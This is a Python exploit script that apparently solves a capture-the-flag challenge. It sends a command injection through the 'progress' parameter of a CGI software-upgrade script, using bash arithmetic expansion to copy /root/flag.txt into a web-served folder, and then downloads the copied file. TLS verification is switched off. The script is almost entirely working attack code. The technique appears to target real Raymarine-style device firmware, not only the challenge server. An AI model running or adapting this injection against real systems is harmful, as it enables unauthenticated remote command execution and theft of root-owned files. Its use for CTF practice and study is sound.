#!/usr/bin/env python3

import sys
import ssl
import urllib.request
import urllib.parse
import re

def solve(base_url="https://raymarine-db564c599f07.chall.nnsc.tf"):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    cmd = "cat /root/flag.txt>/mnt/tmp/httproot/SharedFiles/flag.txt"
    encoded_cmd = cmd.replace(" ", "%20")
    trigger_url = f"{base_url}/cgi-bin/SoftwareUpgrade.sh?ipaddress=1&package=1&progress=x[$({encoded_cmd})0]"

    print(f"[*] Triggering payload via: {trigger_url}")
    req = urllib.request.Request(trigger_url)
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
            print(f"[*] CGI response status: {resp.status}")
    except Exception as e:
        print(f"[!] Request warning (expected): {e}")

    # Fetch exfiltrated flag from /SharedFiles/flag.txt
    flag_url = f"{base_url}/SharedFiles/flag.txt"
    print(f"[*] Retrieving flag from: {flag_url}")
    req_flag = urllib.request.Request(flag_url)
    with urllib.request.urlopen(req_flag, context=ctx, timeout=10) as resp:
        content = resp.read().decode(errors="ignore").strip()
        print(f"[+] Flag content: {content}")
        m = re.search(r"NNS\{[^}]+\}", content)
        if m:
            flag = m.group(0)
            print(f"Flag found: {flag}")
            return flag
        else:
            raise ValueError(f"Flag not found in response: {content}")

if __name__ == "__main__":
    solve()
